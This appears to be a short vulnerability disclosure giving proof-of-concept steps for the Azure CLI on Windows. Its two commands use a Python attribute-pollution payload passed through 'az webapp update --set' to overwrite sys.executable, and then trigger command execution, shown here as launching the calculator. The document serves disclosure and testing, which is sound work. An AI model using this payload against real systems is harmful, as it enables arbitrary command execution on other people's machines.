In the Windows environment:

1. Open the Azure CLI in an interactive mode.
2. Login and ensure the account has access to certain available resources, e.g., a webapp with id X.
3. Input the following payload to pollute the attributes.
```
az webapp update --ids X --set "__class__.__init__.__globals__.sys.executable=calc"
```
4. Input any of the commands or behaviors to trigger the command execution.
```
az execution add --yes --name blueprint
```